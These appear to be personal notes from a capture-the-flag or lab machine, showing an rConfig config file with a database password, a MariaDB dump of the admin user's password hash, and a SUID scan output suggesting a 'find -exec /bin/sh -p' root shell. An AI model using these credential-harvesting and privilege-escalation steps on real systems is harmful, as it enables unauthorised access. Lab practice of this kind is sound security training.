# 6 box enum apache

```
# found config file
- /home/rconfig/config/config.inc.php

bash-4.2$ cat config.inc.php
$config_app_basedir = "/home/rconfig/";
$config_log_basedir = "/home/rconfig/logs/";
define('WEB_DIR', '/home/rconfig/www');

define('DB_HOST', 'localhost');
define('DB_PORT', '3306');
define('DB_NAME', 'rconfig');
define('DB_USER', 'rconfig_user');
define('DB_PASSWORD', 'RconfigUltraSecurePass');

# mysql enum
bash-4.2$ mysql -u rconfig_user -p
Enter password:

MariaDB [(none)]> SELECT @@version;
+----------------+
| @@version      |
+----------------+
| 5.5.65-MariaDB |
+----------------+
1 row in set (0.00 sec)

# db: rconfig
MariaDB [rconfig]> select * from users;
+----+----------+----------------------------------+----------------------------------+-----------+-----------------+------------+--------+
| id | username | password                         | userid                           | userlevel | email           | timestamp  | status |
+----+----------+----------------------------------+----------------------------------+-----------+-----------------+------------+--------+
|  1 | admin    | 4e9f8e413065db3ccb08d4e064381f2b | 6abf66c70aca3c9478df70fcc7f47843 |         9 | admin@admin.com | 1630346166 |      1 |
+----+----------+----------------------------------+----------------------------------+-----------+-----------------+------------+--------+
```

### PEAS

```
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/find -~> https://gtfobins.github.io/gtfobins/find/#suid
------------------------------


[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/bin/find . -exec /bin/sh -p \; -quit
------------------------------
```
